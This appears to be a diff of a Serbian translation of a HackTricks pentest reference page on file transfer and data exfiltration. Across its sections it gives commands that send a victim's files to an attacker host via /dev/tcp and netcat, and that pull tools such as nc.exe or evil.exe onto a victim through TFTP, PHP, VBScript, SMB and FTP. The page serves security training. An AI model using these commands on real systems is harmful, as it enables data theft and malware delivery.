@@ -1,33 +1,25 @@
-# Izfiltracija
+# Exfiltration
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
+## Uobičajeni domeni koji su na beloj listi za exfiltraciju informacija
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli uobičajene domene na beloj listi koje se mogu zloupotrebiti
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Često dozvoljeni domeni za izfiltriranje informacija
-
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često dozvoljene domene koje mogu biti zloupotrebljene
-
-## Kopiranje\&lepljenje Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -63,10 +55,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Postavljanje fajlova
+### Upload files
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer koji prikazuje GET i POST zahteve (takođe zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -80,7 +72,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **HTTPS сервер**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -123,17 +115,17 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP server (python)
+### FTP сервер (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### FTP сервер (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP server (pure-ftp)
+### FTP сервер (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** klijent
+### **Windows** клијент
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -171,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte smb deljenje **koristeći sambu**:
+Ili kreirajte smb deljenje **koristeći samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,20 +179,6 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
-
----
-
-### Exfiltration
-
-Kada je reč o izvlačenju podataka sa Windows sistema, postoje različite metode koje se mogu koristiti. Neke od ovih metoda uključuju:
-
-1. **Upotreba FTP-a:** Korišćenje FTP klijenta za prenos podataka sa zaraženog sistema na udaljeni server.
-2. **Korišćenje Web protokola:** Korišćenje HTTP ili HTTPS protokola za slanje podataka na udaljeni server.
-3. **Korišćenje DNS tunela:** Korišćenje DNS saobraćaja za skrivanje podataka i njihovo slanje na udaljeni server.
-4. **Korišćenje E-maila:** Slanje podataka putem e-mail poruka.
-5. **Korišćenje USB uređaja:** Kopiranje podataka na USB uređaj radi fizičkog iznošenja sa zaraženog sistema.
-
-Svaka od ovih metoda ima svoje prednosti i mane, a izbor odgovarajuće metode zavisi od specifičnih zahteva i okolnosti napada.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -222,26 +200,26 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Mrežni kanal
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje fajla sa žrtve
+### Preuzmi datoteku sa žrtve
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Postavljanje fajla žrtvi
+### Уплоадовање фајла на жртву
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Zahvaljujući **@BinaryShadow\_**
+hvala **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -263,33 +241,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete poslati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću python-a:
+Ako možete slati podatke na SMTP server, možete kreirati SMTP za primanje podataka pomoću Pythona:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u drugima ga je potrebno eksplicitno dodati tokom instalacije)
+Podrazumevano u XP i 2003 (u drugim verzijama treba ga eksplicitno dodati tokom instalacije)
 
-Na Kali, **pokrenite TFTP server**:
+U Kali, **pokreni TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server u Pythonu:**
+**TFTP сервер у Питону:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-U **žrtva**, povežite se sa Kali serverom:
+U **žrtvi**, povežite se na Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Preuzmite fajl pomoću PHP jednolinijske komande:
+Preuzmite datoteku pomoću PHP oneliner-a:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -331,33 +309,31 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog oblika**. To znači da, pružajući heksadecimalni oblik binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do 64 kb veličine**.
+Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb u veličini**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+Zatim kopirajte i nalepite tekst u windows-shell i biće kreiran fajl pod imenom nc.exe.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Učite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
